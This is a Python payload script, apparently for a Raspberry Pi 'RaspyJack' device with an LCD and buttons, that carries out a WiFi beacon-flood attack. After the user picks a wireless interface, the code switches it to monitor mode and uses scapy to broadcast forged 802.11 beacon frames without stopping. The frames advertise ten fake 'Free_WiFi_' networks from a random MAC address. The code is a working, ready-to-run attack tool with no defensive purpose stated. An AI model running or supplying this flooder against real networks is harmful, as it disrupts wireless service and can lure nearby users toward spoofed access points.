import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# WiFi Integration - Import dynamic interface support
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import get_available_interfaces
    from wifi.wifi_manager import WiFiManager
    WIFI_INTEGRATION = True
    wifi_manager = WiFiManager()
    print("✅ WiFi integration loaded - dynamic interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    WIFI_INTEGRATION = False
    wifi_manager = None # Ensure wifi_manager is None if import fails

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# ---------------------------- Third‑party libs ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print("Scapy is not installed. Please run: pip install scapy", file=sys.stderr)
    sys.exit(1)

# --- CONFIGURATION ---
WIFI_INTERFACE = None # Will be set by user selection
SSID_PREFIX = "Free_WiFi_"
NUM_SSIDS = 10
BEACON_INTERVAL = 0.1 # seconds between sending each beacon frame

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY3": 16 } # Added UP/DOWN for menu navigation

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT = ImageFont.load_default()
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    WIDTH, HEIGHT = 128, 128
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = None # Fallback to None if ImageFont is a dummy
    FONT = None # Fallback to None if ImageFont is a dummy

# --- Globals & Shutdown ---
running = True
flood_thread = None
ui_lock = threading.Lock()
status_msg = "Press OK to start"
current_menu_selection = 0 # For interface selection menu

def cleanup(*_):
    global running
    running = False
    if flood_thread and flood_thread.is_alive():
        flood_thread.join(timeout=1) # Wait for flood thread to finish
    
    # Deactivate monitor mode on cleanup
    if WIFI_INTERFACE and wifi_manager:
        print(f"Deactivating monitor mode on {WIFI_INTERFACE}...")
        wifi_manager.deactivate_monitor_mode(WIFI_INTERFACE)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI Functions ---
def draw_message(message: str, color: str = "yellow"):
    if not HARDWARE_LIBS_AVAILABLE:
        print(message)
        return
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (128 - w) // 2
    y = (128 - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_main():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "WiFi Beacon Flood", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    with ui_lock:
        d.text((10, 40), f"Interface: {WIFI_INTERFACE}", font=FONT, fill="white")
        d.text((10, 55), f"Prefix: {SSID_PREFIX}", font=FONT, fill="white")
        d.text((10, 70), f"SSIDs: {NUM_SSIDS}", font=FONT, fill="white")
        d.text((10, 85), status_msg, font=FONT, fill="yellow")

    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, current_menu_selection, status_msg
    
    if not WIFI_INTEGRATION or not wifi_manager:
        draw_message("WiFi integration not available!", "red")
        time.sleep(3)
        return False

    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    if not available_interfaces:
        draw_message("No WiFi interfaces found!", "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    while running:
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0:
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            selected_iface = available_interfaces[current_menu_selection]
            draw_message(f"Activating monitor\nmode on {selected_iface}...", "yellow")
            
            monitor_iface = wifi_manager.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                draw_message(f"Monitor mode active\non {WIFI_INTERFACE}", "lime")
                time.sleep(2)
                return True
            else:
                draw_message(f"Failed to activate\nmonitor mode on {selected_iface}", "red")
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0: # Cancel
            return False
        
        time.sleep(0.1)

# --- Flood Function ---
def beacon_flood():
    global status_msg
    
    if not WIFI_INTERFACE:
        with ui_lock:
            status_msg = "No interface selected!"
        return

    # Generate random MAC address for the AP
    ap_mac = RandMAC()

    # Create beacon frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)
    
    # Create a list of SSIDs
    ssids = [f"{SSID_PREFIX}{i:02d}" for i in range(NUM_SSIDS)]

    with ui_lock:
        status_msg = "Flooding..."
    
    try:
        while running:
            for ssid in ssids:
                if not running: break
                # Create beacon frame with current SSID
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                
                # Assemble the packet
                packet = RadioTap()/dot11/beacon/essid
                
                # Send the packet
                sendp(packet, iface=WIFI_INTERFACE, verbose=0)
                
                with ui_lock:
                    status_msg = f"Flooding: {ssid}"
                
                time.sleep(BEACON_INTERVAL)
    except Exception as e:
        with ui_lock:
            status_msg = f"Error: {e}"
        print(f"Error during beacon flood: {e}", file=sys.stderr)

# --- Main Loop ---
try:
    if not select_interface_menu():
        draw_message("No interface selected\nor monitor mode failed.", "red")
        time.sleep(3)
        raise SystemExit("No interface selected or monitor mode failed.")

    while running:
        draw_ui_main()
        
        if GPIO.input(PINS["KEY3"]) == 0:
            cleanup()
            break
        
        if GPIO.input(PINS["OK"]) == 0:
            if not (flood_thread and flood_thread.is_alive()):
                flood_thread = threading.Thread(target=beacon_flood, daemon=True)
                flood_thread.start()
            time.sleep(0.3)
        
        # Allow changing settings while not flooding (e.g., SSID prefix, num SSIDs)
        # For now, just redraw UI
        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("WiFi Beacon Flood payload finished.")
